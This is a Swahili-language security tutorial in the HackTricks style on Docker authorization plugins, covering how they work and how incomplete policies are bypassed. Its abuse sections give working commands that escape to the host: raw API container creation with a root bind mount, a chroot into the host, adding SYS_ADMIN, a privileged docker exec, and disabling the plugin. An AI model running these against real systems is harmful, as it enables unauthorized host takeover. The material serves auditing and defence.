# Plugins za Uidhinishaji wa Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Plugins za uidhinishaji za Runtime ni safu ya ziada ya sera inayoamua ikiwa mtumiaji anaweza kutekeleza kitendo fulani cha daemon. Docker ni mfano wa kawaida. Kwa chaguomsingi, mtu yeyote anayeweza kuwasiliana na Docker daemon ana udhibiti mpana juu yake. Plugins za uidhinishaji hujaribu kuweka mipaka kwa kuchunguza mtumiaji aliyethibitishwa na operesheni ya API iliyoombwa, kisha kuruhusu au kukataa ombi kulingana na sera.

Mada hii inastahili ukurasa wake kwa sababu hubadilisha muundo wa exploitation wakati mshambuliaji tayari anaweza kufikia Docker API au ana akaunti ya mtumiaji katika kikundi cha `docker`. Katika mazingira kama hayo, swali si tu "je, ninaweza kufikia daemon?" bali pia "je, daemon imelindwa na safu ya uidhinishaji, na ikiwa ndivyo, je, safu hiyo inaweza kukwepwa kupitia endpoints ambazo hazijashughulikiwa, uchanganuzi dhaifu wa JSON, au ruhusa za usimamizi wa plugins?"

## Uendeshaji

Ombi linapofika kwa Docker daemon, mfumo wa uidhinishaji unaweza kupitisha muktadha wa ombi kwa plugins moja au zaidi zilizosakinishwa. Plugin huona utambulisho wa mtumiaji aliyethibitishwa, maelezo ya ombi, headers zilizochaguliwa na sehemu za mwili wa ombi au jibu pale aina ya maudhui inapofaa. Plugins nyingi zinaweza kuunganishwa, na ufikiaji hutolewa tu ikiwa plugins zote zinaruhusu ombi.

Muundo huu unaonekana imara, lakini usalama wake hutegemea kabisa jinsi mwandishi wa sera alivyoielewa API kwa ukamilifu. Plugin inayozuia `docker run --privileged` lakini kupuuza `docker exec`, kukosa funguo mbadala za JSON kama vile `Binds` ya ngazi ya juu, au kuruhusu usimamizi wa plugins inaweza kutoa hisia potofu ya ulinzi huku ikiendelea kuacha njia za moja kwa moja za kupandisha ruhusa wazi.

## Malengo ya Kawaida ya Plugins

Maeneo muhimu ya kukagua sera ni:

- endpoints za kuunda containers
- sehemu za `HostConfig` kama vile `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` na chaguo za kushiriki namespaces
- tabia ya `docker exec`
- endpoints za usimamizi wa plugins
- endpoint yoyote inayoweza kuchochea kwa njia isiyo ya moja kwa moja vitendo vya runtime vilivyo nje ya muundo wa sera uliokusudiwa

Kihistoria, mifano kama vile plugin ya `authz` ya Twistlock na plugins rahisi za kujifunzia kama `authobot` ilirahisisha uchunguzi wa muundo huu, kwa sababu faili zake za sera na njia za msimbo zilionyesha jinsi ulinganishaji wa endpoint na kitendo ulivyotekelezwa. Kwa kazi za tathmini, somo muhimu ni kwamba mwandishi wa sera lazima aelewe API nzima badala ya amri za CLI zinazoonekana zaidi.

## Matumizi Mabaya

Lengo la kwanza ni kubaini ni nini hasa kinachozuiwa. Daemon inapokataa kitendo, ujumbe wa hitilafu mara nyingi huvuja jina la plugin, jambo linalosaidia kutambua udhibiti unaotumika:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Ikiwa unahitaji uchanganuzi mpana zaidi wa endpoint, zana kama `docker_auth_profiler` ni muhimu kwa sababu zinajiendesha kazi inayojirudia ya kuangalia ni njia zipi za API na miundo ipi ya JSON inaruhusiwa na plugin.

Ikiwa mazingira yanatumia plugin maalum na unaweza kuwasiliana na API, orodhesha sehemu zipi za object zimechujwa:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Ukaguzi huu ni muhimu kwa sababu hitilafu nyingi za uidhinishaji huhusu sehemu mahususi, si dhana nzima. Plugin inaweza kukataa muundo wa CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Huongeza Haki Baada ya Kontena Kuundwa

Sera inayozuia uundaji wa kontena zenye haki za juu lakini kuruhusu uundaji wa kontena zisizozuiliwa pamoja na `docker exec` bado inaweza kupitwa:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Ikiwa daemon itakubali hatua ya pili, mtumiaji atakuwa amepata mchakato shirikishi wenye haki za juu ndani ya container ambayo mwandishi wa sera aliamini kuwa imewekewa vizuizi.

Sheria iliyozuiwa ya `sudo` inaweza kufichua njia hiyo hiyo hata kama mtumiaji anayeita hana ufikiaji wa moja kwa moja wa Docker socket. Kwa mfano, ruhusa ya `/usr/bin/docker exec *` yenye uwezo wa root inaweza kumruhusu mtumiaji kutoa chaguo za Docker za `--privileged` na `--user root`. Container inayofanya kazi bado inahitajika; kwenye baadhi ya host za Linux, kitambulisho chake huonekana kwenye mstari wa amri wa mchakato wa `containerd-shim` wakati `docker ps` imezuiwa. Ichukulie sheria hiyo kama kidokezo cha ukaguzi: thibitisha sera halisi ya sudo, vidhibiti vya uidhinishaji vya daemon, user namespaces, na kama mchakato unaotokana na hilo unaweza kufikia kifaa cha host au mount ya host inayoweza kuandikwa. Docker inaeleza chaguo za exec kwenye [marejeleo ya CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Wrapper inayoendeshwa na root na inayokubali Compose file iliyochaguliwa na mtumiaji inahitaji kuthibitisha [muundo mzima wa huduma ya Compose](https://docs.docker.com/reference/compose-file/services/), si kukataa tu `privileged: true` na kuhitaji `:ro` kwenye bind mounts. Kagua `cap_add`, `security_opt`, vifaa, namespaces, ingizo za build, na kila sintaksia ya volume inayotumika. Bind mount ya kusoma pekee bado inaweza kuandikika kutoka ndani ya container yenye capabilities zinazofaa na vizuizi vya usalama vilivyolegezwa, kutegemea sera ya daemon na kernel. Orodha za ruhusa za njia za host zinazotegemea kiambishi awali pekee, na ukaguzi wa symlink kwenye sehemu ya mwisho ya njia, pia zinahitaji kukaguliwa. Sheria ya sudo na mwito halisi wa `docker-compose up` hutambua uwezekano wa tatizo; uthibitishaji halisi wa wrapper na vizuizi vya daemon wakati wa runtime ndivyo huamua kama linaweza kutumiwa vibaya.

### Mfano Kamili: Bind Mount Kupitia Raw API

Baadhi ya sera zenye hitilafu hukagua umbo moja tu la JSON. Ikiwa bind mount ya root filesystem haizuiwi kwa uthabiti, host bado inaweza kuwekewa mount:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Wazo hilo hilo linaweza pia kuonekana chini ya `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Athari yake ni kutoroka kwenye mfumo mzima wa faili wa host. Jambo la kuvutia ni kwamba bypass inatokana na sera kutofunika hali zote, badala ya hitilafu ya kernel.

### Mfano Kamili: Attribute ya Capability Isiyokaguliwa

Sera ikisahau kuchuja attribute inayohusiana na capability, mshambuliaji anaweza kuunda container inayopata tena capability hatari:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Mara tu `CAP_SYS_ADMIN` au capability nyingine yenye nguvu sawa inapokuwepo, mbinu nyingi za breakout zilizoelezwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) zinaweza kutumika.

### Mfano Kamili: Kuzima Plugin

Ikiwa shughuli za usimamizi wa plugin zimeruhusiwa, njia safi zaidi ya kukwepa udhibiti inaweza kuwa kuuzima kabisa:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Huu ni ukiukaji wa sera katika kiwango cha control-plane. Tabaka la uidhinishaji lipo, lakini mtumiaji ambaye lilipaswa kumwekea vikwazo bado ana ruhusa ya kulizima.

## Ukaguzi

Amri hizi zinalenga kubaini kama kuna tabaka la sera na kama linaonekana kuwa kamili au la juu juu.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Kinachovutia hapa:

- Ujumbe wa kukataa unaojumuisha jina la plugin huthibitisha kuwepo kwa safu ya authorization na mara nyingi hufichua implementation halisi.
- Orodha ya plugins inayoonekana kwa mshambuliaji inaweza kutosha kubaini kama inawezekana kuzima au kusanidi upya.
- Sera inayozuia tu vitendo vya wazi vya CLI lakini si maombi ghafi ya API inapaswa kuchukuliwa kuwa inaweza kuepukwa hadi ithibitishwe vinginevyo.

## Chaguomsingi za Runtime

| Runtime / platform | Hali chaguomsingi | Tabia chaguomsingi | Njia za kawaida za kudhoofisha mipangilio mwenyewe |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa chaguomsingi | Ufikiaji wa daemon kwa vitendo huruhusu kila kitu au haukubali chochote, isipokuwa plugin ya authorization iwe imesanidiwa | Sera ya plugin isiyokamilika, kutumia blacklists badala ya allowlists, kuruhusu usimamizi wa plugins, mapungufu ya ukaguzi wa kiwango cha field |
| Podman | Hakuna kitu kinacholingana nacho moja kwa moja kwa kawaida | Podman kwa kawaida hutegemea zaidi ruhusa za Unix, uendeshaji wa rootless na maamuzi ya kufichua API kuliko plugins za authz za mtindo wa Docker | Kufichua API ya Podman ya rootful kwa upana, ruhusa dhaifu za socket |
| containerd / CRI-O | Muundo tofauti wa udhibiti | Runtime hizi kwa kawaida hutegemea ruhusa za socket, mipaka ya uaminifu ya node na vidhibiti vya orchestrator vya tabaka za juu badala ya plugins za authz za Docker | Kuweka socket ndani ya workloads, dhana dhaifu za uaminifu za ndani ya node |
| Kubernetes | Hutumia authn/authz katika tabaka za API-server na kubelet, si plugins za authz za Docker | RBAC ya cluster na vidhibiti vya admission ndizo safu kuu ya sera | RBAC pana kupita kiasi, sera dhaifu ya admission, kufichua API za kubelet au runtime moja kwa moja |

{{#include ../../../banners/hacktricks-training.md}}
